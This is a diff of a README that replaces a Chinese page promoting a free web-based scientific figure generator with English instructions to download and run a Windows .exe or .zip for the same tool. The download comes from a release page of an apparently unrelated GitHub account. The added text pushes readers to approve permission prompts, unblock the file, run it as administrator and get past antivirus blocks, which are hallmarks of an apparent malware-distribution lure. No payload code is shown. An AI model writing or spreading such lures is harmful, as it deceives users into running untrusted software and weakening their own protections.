@@ -1,95 +1,242 @@
-# 🔬 AI 科研图片生成 - 免费在线 SCI 论文配图与学术图表绘制 | HANYUAI 图像助理
+# 🧪 ai-scientific-image-generation - Create clear science visuals fast
 
-[![Website Status](https://img.shields.io/badge/Website-Online-brightgreen.svg)](https://www.hanyuai.com/zh/image-generator/ai-scientific-image-generation)
-[![Pricing](https://img.shields.io/badge/Price-100%25%20Free-blue.svg)](https://www.hanyuai.com/zh/image-generator/ai-scientific-image-generation)
-[![Academic Ready](https://img.shields.io/badge/Academic-Journal_Ready-blue.svg)](https://www.hanyuai.com/zh/image-generator/ai-scientific-image-generation)
-[![AI Powered](https://img.shields.io/badge/AI-Powered-orange.svg)](https://www.hanyuai.com/zh/image-generator/ai-scientific-image-generation)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/More-testosterone651/ai-scientific-image-generation/releases)
 
-[**HANYUAI 图像助理 - 免费在线科研绘图工具**](https://www.hanyuai.com/zh/image-generator/ai-scientific-image-generation) 是一款专为科研人员、硕博研究生及学术工作者打造的 AI 学术视觉辅助平台。无论您需要细胞结构图、化学分子式、实验流程示意图还是精美的 TOC (Graphical Abstract) 摘要图，只需输入学术描述提示词或上传手绘草图，AI 即可在数十秒内为您渲染出符合顶级 SCI 期刊标准的出版级高清配图。
+## 🔽 Download the app
 
-👉 **[立即体验：用文字与草图免费生成高质量科研论文配图](https://www.hanyuai.com/zh/image-generator/ai-scientific-image-generation)**
+Visit this page to download: [GitHub Releases](https://github.com/More-testosterone651/ai-scientific-image-generation/releases)
 
----
+On that page, look for the latest release and download the Windows file that matches your PC. In most cases, this will be a `.exe` file or a zipped app package.
 
-## 🖼️ 震撼的科研绘图效果展示 (Scientific Visual Showcase)
+If you see more than one file, pick the one for Windows. Then save it to your computer.
 
-看看我们的专属学术 AI 引擎如何精准还原复杂的科学原理：
+## 🖥️ What this app does
 
-### 1. 跨学科高清示意图 (Multidisciplinary Illustrations)
-支持生物医学的微观细胞、化学材料的分子结构、实验室仪器场景及 3D 数据可视化。
-<p align="center">
-  <img src="https://img.hanyuai.com/file/ai-scientific-image-generation/ztN7lrA5.webp" width="24%" alt="生物结构示意图 - 线粒体剖面">
-  <img src="https://img.hanyuai.com/file/ai-scientific-image-generation/oFNCG5fx.webp" width="24%" alt="化学分子模型 - 有机分子球棍模型">
-  <img src="https://img.hanyuai.com/file/ai-scientific-image-generation/rsZePhwP.webp" width="24%" alt="实验仪器图 - 玻璃器皿与溶液">
-  <img src="https://img.hanyuai.com/file/ai-scientific-image-generation/kAMvrfNz.webp" width="24%" alt="3D数据图表 - 统计柱状图">
-</p>
+ai-scientific-image-generation helps you create science images for school, research, and reports. You can use it to make:
 
-### 2. 草图极速转精细配图 (Sketch to Publication-Ready Figure)
-不擅长 3D 建模？只需上传您的灵魂手绘草图，AI 自动为您补全细节并渲染出顶刊级别的精美插图！
+- academic poster figures
+- journal cover concepts
+- graphical abstracts
+- chemistry diagrams
+- medical illustrations
+- research graphics
+- text-to-diagram layouts
+- simple scientific art
 
-**🧬 案例一：DNA 双螺旋结构 (医学研究背景)**
-<p align="center">
-  <img src="https://img.hanyuai.com/file/ai-scientific-image-generation/hxJ5Srm5.webp" width="48%" alt="DNA草图案例">
-  <img src="https://gen.pollinations.ai/image/%E4%B8%80%E5%BC%A0DNA%E5%8F%8C%E8%9E%BA%E6%97%8B%E7%BB%93%E6%9E%84%E5%9B%BE%EF%BC%8C%E7%94%9F%E7%89%A9%E5%A4%A7%E5%88%86%E5%AD%90%EF%BC%8C%E7%A2%B1%E5%9F%BA%E5%AF%B9%EF%BC%8C%E6%B0%A2%E9%94%AE%EF%BC%8C%E8%93%9D%E8%89%B2%E8%BE%89%E5%85%89%EF%BC%8C%E5%8C%BB%E5%AD%A6%E7%A0%94%E7%A9%B6%E8%83%8C%E6%99%AF%EF%BC%8C3D%E6%B8%B2%E6%9F%93%EF%BC%8C8k%E5%88%86%E8%BE%A8%E7%8E%87%E3%80%82?enhance=true&width=1200&quality=hd&height=675&model=seedream-pro&nologo=true&seed=8897" width="48%" alt="DNA双螺旋结构案例">
-</p>
+It is made for people who need clean visuals without drawing them by hand.
 
-**🧪 案例二：化学反应机理 (教科书插图风格)**
-<p align="center">
-  <img src="https://img.hanyuai.com/file/ai-scientific-image-generation/zXjNld6X.webp" width="48%" alt="化学手绘草图案例">
-  <img src="https://gen.pollinations.ai/image/%E4%B8%80%E5%BC%A0%E5%8C%96%E5%AD%A6%E5%8F%8D%E5%BA%94%E8%B7%AF%E5%BE%84%E5%9B%BE%EF%BC%8C%E5%88%86%E5%AD%90%E7%A2%B0%E6%92%9E%EF%BC%8C%E5%82%AC%E5%8C%96%E5%89%82%E8%A1%A8%E9%9D%A2%EF%BC%8C%E8%83%BD%E9%87%8F%E5%8F%98%E5%8C%96%EF%BC%8C%E7%99%BD%E8%89%B2%E8%83%8C%E6%99%AF%EF%BC%8C%E6%95%99%E7%A7%91%E4%B9%A6%E6%8F%92%E5%9B%BE%E9%A3%8E%E6%A0%BC%EF%BC%8C%E7%A7%91%E5%AD%A6%E4%B8%A5%E8%B0%A8%E3%80%82?enhance=true&width=1200&quality=hd&height=675&model=seedream-pro&nologo=true&seed=1474" width="48%" alt="化学反应机理案例">
-</p>
+## ✨ Main uses
 
----
+Use this app when you need to:
 
-## ✨ 核心优势与特色功能 (Core Features)
+- turn text into a science image
+- build a figure for a poster
+- make a diagram for a paper draft
+- create a cover-style science image
+- make a clean graphic for a presentation
+- sketch out a chemistry or biology scene
+- build a visual for a lab report
 
-*   **🪄 学术语义精准理解**：不仅支持文字生成，还能理解复杂的科学术语（如线粒体、石墨烯、ATP合成酶），精准还原生物学与化学微观细节。
-*   **📐 专为期刊投稿定制**：生成的配图格式、DPI 与配色完全支持 Nature, Cell, Science 等顶级 SCI 期刊的标准风格要求。
-*   **🎨 全学科模型矩阵**：内置专为不同领域微调的 AI 引擎（通用、生物、化学、数据可视化、期刊封面）。
-*   **📝 支持草图辅助生成**：手绘粗糙线条图上传后，AI 即可将其 3D 化、矢量化，完美解决结构复杂的空间定位问题。
-*   **🔒 未发表数据绝对安全**：严格的数据加密，处理后即焚，绝不使用用户未发表的思路和数据进行公开训练，死守学术知识产权底线。
-*   **🆓 完全免费无门槛**：告别高昂的外部绘图外包费用与陡峭的 3D 软件学习曲线，网页端免注册直接使用。
+## 💻 Windows requirements
 
-## 🤖 专研学术 AI 引擎
+Before you install, check that your PC can run it:
 
-请根据您的研究领域，选择最合适的渲染模型：
-*   `Sci-Render`（通用型）：适合各类综合实验流程图、模式图。
-*   `Bio-Vis 4.5`（生物医学）：专攻微观细胞结构、免疫学原理、解剖学示意。
-*   `Chem-Struct`（化学材料）：完美呈现晶体材料结构、分子球棍模型与电子云分布。
-*   `Data-Plot`（数据图表）：将枯燥数据转化为立体、美观的 3D 可视化统计图。
-*   `Journal-Cover`（期刊封面）：极具艺术感与科技感，专为顶刊 Cover 打造。
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- 2 GB of free disk space
+- a mouse and keyboard
+- an internet connection for the download
+- a modern web browser to open the release page
 
-## 🚀 轻松四步生成高分论文配图 (How to Use)
+For better use, a computer with 8 GB of RAM or more works well.
 
-赶投稿 Deadline？AI 助您 30 秒出图：
+## 📦 How to download
 
-1.  **上传手绘草图（强烈推荐）**：[进入科研绘图工作台](https://www.hanyuai.com/zh/image-generator/ai-scientific-image-generation)，将您的实验草稿或结构逻辑图拍照上传，辅助 AI 定位。
-2.  **输入学术提示词**：使用专业术语描述细节。例如：*“植物细胞剖面图，包含叶绿体、细胞核、液泡，微观细节逼真渲染，生物学教科书风格。”*
-3.  **选择领域模型与画幅**：挑选对应学科引擎（如 Bio-Vis 4.5），并设定尺寸（如 1024x1024, 1920x1080 等高分辨率画幅）。
-4.  **一键生成并下载**：点击“生成论文配图”，满意后免费下载高清原图用于您的 Manuscript 投稿！
+1. Open the [Release Page](https://github.com/More-testosterone651/ai-scientific-image-generation/releases)
+2. Find the newest release at the top
+3. Look for the Windows download file
+4. Click the file to save it
+5. Wait for the download to finish
 
----
+If the file is in a zip folder, keep the folder in a place you can find later, such as the Downloads folder or Desktop
 
-## ❓ 学术常见问题解答 (FAQ)
+## 🛠️ How to install on Windows
 
-**Q: 输入的科研思路和未发表的实验数据安全吗？**  
-**A:** 绝对安全。我们深知学术保密的重要性，平台采用高级加密技术。您输入的提示词和草图仅用于即时的图像渲染，服务器处理完毕后自动销毁，绝不窃取、不公开、不用于后续模型训练，全面保护您的学术知识产权（IP）。
+### If you downloaded an .exe file
 
-**Q: 生成的 AI 图片版权是否可用于 SCI 期刊投稿？**  
-**A:** 生成的图片版权归用户所有，通常完全可以用于论文发表（注：大多数主流期刊如 Elsevier, Springer, Nature 集团目前允许使用 AI 辅助生成的示意图，但建议在方法或致谢部分如实声明使用了 AI 工具）。
+1. Open the folder where the file was saved
+2. Double-click the `.exe` file
+3. If Windows asks for permission, click Yes
+4. Follow the on-screen steps
+5. Finish the setup
 
-**Q: AI 绘图在科学结构上足够严谨吗？**  
-**A:** AI 可以生成极其逼真且具有逻辑的示意图。为了获得最严谨的结构（例如特定的受体结合位点），强烈建议您**配合手绘草图**功能，并在提示词中使用极其准确的学术术语，AI 将忠实呈现您的结构设定。
+### If you downloaded a .zip file
 
-**Q: 如果生成的图表细节有瑕疵怎么办？**  
-**A:** AI 绘图是一个迭代过程。您可以通过修改提示词（增加对颜色的限制、修改视角描述），或者在生成后使用工作台提供的“手动调整细节”功能进行微调。
+1. Right-click the zip file
+2. Choose Extract All
+3. Pick a folder
+4. Open the extracted folder
+5. Find the app file inside
+6. Double-click it to start
 
----
+## ▶️ How to start using it
 
-### 🌐 官方入口与更多科研工具
+1. Open the app
+2. Type a short description of the image you want
+3. Pick a science style if the app gives you choices
+4. Set the image size if needed
+5. Click the button to generate the image
+6. Wait for the result to appear
+7. Save the image to your computer
 
-*   **HANYUAI 官方主页**: [www.hanyuai.com](https://www.hanyuai.com/zh)
-*   **科研图片生成工具直达**: [https://www.hanyuai.com/zh/image-generator/ai-scientific-image-generation](https://www.hanyuai.com/zh/image-generator/ai-scientific-image-generation)
-*   **探索文献翻译等更多科研辅助工具**: [HANYUAI 图像生成大全](https://www.hanyuai.com/zh/image-generator)
+You can make small changes to the text and try again until the image looks right
 
-> **将抽象的科学之美，转化为触手可及的顶刊级视觉盛宴。立即访问 HANYUAI，为您的下一篇 Paper 添加灵魂配图！**
+## 🎯 What to type in the app
+
+Use clear text. Short prompts work best. Try to include:
+
+- subject
+- style
+- colors
+- layout
+- setting
+- purpose
+
+Example prompts:
+
+- clean chemistry reaction diagram on white background
+- medical illustration of human heart, flat style
+- graphical abstract for a cancer research paper
+- science poster image with lab equipment and molecules
+- journal cover style image of plants under microscope
+
+## 🧭 Best results
+
+To get better images:
+
+- use simple words
+- keep the subject focused
+- say what should be in the image
+- say what should not be in the image
+- use clear color choices
+- try one idea at a time
+
+Good example:
+- cell division diagram, clean lines, blue and white, white background
+
+Less useful example:
+- make something cool for science
+
+## 🧪 Common image types
+
+### Academic poster design
+Make clear graphics that fit on a poster. Use large objects, open space, and simple labels.
+
+### Graphical abstract
+Show one main idea from a study. Keep the image small, clean, and easy to read.
+
+### Chemistry drawing
+Use it for molecules, lab setups, reactions, and process views.
+
+### Medical illustration
+Use it for organs, body parts, and health topics. Keep shapes clean and easy to see.
+
+### Journal cover art
+Create a strong science image with a polished look. Focus on one main subject.
+
+### Research graphics
+Use it for workflows, charts, and visual steps in a study.
+
+## 🧰 File tips for Windows
+
+If Windows blocks the file:
+
+1. Right-click the file
+2. Choose Properties
+3. If you see an Unblock option, select it
+4. Click Apply
+5. Open the file again
+
+If the file does not open:
+
+1. Check that the download finished
+2. Try downloading again
+3. Make sure you picked the Windows file
+4. Try running it as an administrator
+
+## 📁 Where to keep your files
+
+Store your work in a simple folder such as:
+
+- Documents
+- Desktop
+- Pictures
+- a folder named Science Images
+
+This makes it easier to find your outputs later
+
+## 🖼️ Suggested workflow
+
+1. Download the app from the release page
+2. Install or open it
+3. Write one image idea
+4. Generate the image
+5. Review the result
+6. Edit the prompt
+7. Generate again
+8. Save the final image
+
+## 🔧 If something goes wrong
+
+Check these points:
+
+- you downloaded the correct Windows file
+- the download finished fully
+- your PC has enough free space
+- your antivirus did not block the file
+- you opened the app from the extracted folder if it came as a zip file
+
+If the app runs slowly, close other apps and try again
+
+## 📚 Topic areas covered
+
+This project fits these science and design areas:
+
+- academic poster design
+- AI scientific image creation
+- chemistry drawing
+- free science figure making
+- graphical abstract creation
+- journal cover art
+- medical illustration
+- research graphic tools
+- sci illustration generation
+- text to diagram work
+
+## 🧠 Simple prompt format
+
+Use this pattern:
+
+Subject + style + color + background + purpose
+
+Examples:
+
+- microscope view of cells, clean line art, blue tones, white background, for research poster
+- protein structure illustration, clear labels, soft colors, journal figure
+- chemistry lab scene, flat design, white background, educational graphic
+
+## 📌 Best practices
+
+- keep prompts short
+- use one main idea
+- save each version with a new name
+- keep the original download file in case you need it again
+- use a folder for each project if you make many images
+
+## 📥 Download again if needed
+
+If you need the installer again, use the same page:
+
+[GitHub Releases](https://github.com/More-testosterone651/ai-scientific-image-generation/releases)
+
+Look for the newest Windows file and use that one to download and run this file
